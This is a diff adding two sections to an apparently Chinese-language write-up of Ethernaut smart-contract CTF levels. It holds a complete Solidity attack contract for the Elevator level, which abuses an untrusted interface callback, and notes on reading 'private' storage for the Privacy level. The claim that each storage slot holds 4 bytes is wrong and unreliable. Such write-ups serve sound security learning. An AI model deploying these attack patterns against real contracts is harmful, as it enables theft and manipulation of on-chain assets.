@@ -107,3 +107,35 @@ contract Hack {
      }
 }
 ```
+## 12. Elevator
+编写攻击合约, 实现isLastFloor方法, 判断Elevator合约的floor是否为目标楼层, 根据情况返回结果
+```solidity
+contract Hack {
+    Elevator e = Elevator(0x5C77b7D11a6CeDc83D0f41D096C3E6874dF7CeF9);
+    
+    function hack() public  {
+        e.goTo(10);
+    }
+
+    function isLastFloor(uint256 floor) external view returns (bool) {
+        uint256 i = e.floor();
+        if (i == floor) return true;
+        else return false;
+    }
+
+}
+```
+## 13. Privacy
+solidity合约的每个slot存4个bytes
+变量值排布如下
+```
+0: |X    X    X    bool|
+1: |      uint256      |
+2: |uint8 uint8 uint16 |
+3: |      bytes32      |
+4: |      bytes32      |
+5: |      bytes32      |
+```
+因此所需数据data[2]在slot5中
+再对数据截断, 转换为bytes16
+参考文档: https://docs.soliditylang.org/en/v0.8.7/internals/layout_in_storage.html#
